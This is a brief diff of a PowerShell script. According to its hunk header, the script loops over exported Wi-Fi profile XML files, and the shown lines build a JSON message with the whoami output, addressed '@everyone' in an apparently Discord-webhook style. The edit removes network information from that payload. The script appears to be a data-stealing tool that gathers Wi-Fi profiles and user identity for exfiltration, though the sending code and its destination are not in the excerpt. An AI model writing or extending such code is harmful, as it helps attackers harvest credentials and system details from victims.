@@ -34,7 +34,7 @@ Get-ChildItem "$e\Wi-Fi*.xml" | ForEach-Object {
 
 $whoami_content = whoami
 $payload = @{
-  content = "@everyone: $whoami_content | $networkInfo"
+  content = "@everyone: $whoami_content"
 } | ConvertTo-Json -Compress
 
 # Fix newline breaks
